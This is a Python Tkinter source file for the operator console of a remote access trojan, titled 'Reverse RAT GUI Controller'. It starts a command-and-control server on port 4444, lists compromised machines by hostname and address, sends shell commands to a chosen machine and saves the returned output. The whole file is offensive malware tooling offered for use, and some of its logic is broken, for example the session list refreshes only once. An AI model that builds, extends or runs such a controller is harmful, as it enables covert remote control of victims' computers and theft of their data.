import base64
import threading
import tkinter as tk

from server import C2Server


class RemoteAdminGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Reverse RAT GUI Controller")

        self.server = None
        self.running = False

        # --- controls ---
        self.host_var = tk.StringVar(value="0.0.0.0")
        self.port_var = tk.StringVar(value="4444")
        self.token_var = tk.StringVar(value="change-me")

        tk.Label(root, text="Host:").grid(row=0, column=0, sticky="e")
        tk.Entry(root, textvariable=self.host_var).grid(row=0, column=1, sticky="we")

        tk.Label(root, text="Port:").grid(row=1, column=0, sticky="e")
        tk.Entry(root, textvariable=self.port_var).grid(row=1, column=1, sticky="we")

        tk.Label(root, text="Token:").grid(row=2, column=0, sticky="e")
        tk.Entry(root, textvariable=self.token_var).grid(row=2, column=1, sticky="we")

        self.start_server_button = tk.Button(root, text="Start Server", command=self.start_server)
        self.start_server_button.grid(row=3, column=0, columnspan=2, sticky="we", pady=4)

        # --- session list ---
        tk.Label(root, text="Active Sessions:").grid(
            row=4, column=0, columnspan=2, sticky="w"
        )
        self.session_list = tk.Listbox(root, height=6)
        self.session_list.grid(row=5, column=0, columnspan=2, sticky="nsew", padx=4, pady=4)

        # --- command area ---
        self.command_entry = tk.Entry(root)
        self.command_entry.grid(row=6, column=0, columnspan=2, sticky="we", padx=4, pady=2)
        self.command_entry.bind("<Return>", lambda e: self.send_command())

        self.send_command_button = tk.Button(root, text="Send Command", command=self.send_command)
        self.send_command_button.grid(row=7, column=0, columnspan=2, sticky="we", pady=2)

        # --- log/output ---
        self.output = tk.Text(root, height=12)
        self.output.grid(row=8, column=0, columnspan=2, sticky="nsew", padx=4, pady=4)

        root.columnconfigure(1, weight=1)
        root.rowconfigure(8, weight=1)

    def log(self, msg):
        self.output.insert(tk.END, str(msg) + "\n")
        self.output.see(tk.END)

    def start_server(self):
        if self.server:
            return

        host = self.host_var.get()
        port = int(self.port_var.get())
        token = self.token_var.get()

        self.server = C2Server(host, port, token, log=self.log)
        self.server.start()
        self.running = True
        self.update_sessions()

    def update_sessions(self):
        if not self.running:
            return

        self.session_list.delete(0, tk.END)
        if self.server:
            for session in self.server.sessions:
                if session.alive:
                    hostname = session.info.get('hostname') or "Unknown"
                    addr = session.addr[0]
                    self.session_list.insert(tk.END, f"{session.id}: {hostname} ({addr})")

    def selected_session(self):
        if not self.server:
            return None
        sel = self.session_list.curselection()
        if not sel:
            return None
        idx = int(sel[0])
        if idx >= len(self.server.sessions):
            return None
        session = self.server.sessions[idx]
        if not session.alive:
            return None
        return session

    def send_command(self, command=None):
        if not (session := self.selected_session()):
            self.log("[-] No active session selected")
            return

        cmd = self.command_entry.get().strip()
        if not cmd:
            return

        self.command_entry.delete(0, tk.END)

        def worker():
            try:
                resp = session.command({"type": "exec", "cmd": cmd})
                data = base64.b64decode(resp["data"])
                local_file_path = f"session_{session.id}_{cmd}.bin"
                with open(local_file_path, "wb") as file:
                    file.write(data)
            except Exception as e:
                self.log(f"[ERROR] {e}")

        threading.Thread(target=worker, daemon=True).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = RemoteAdminGUI(root)
    root.mainloop()
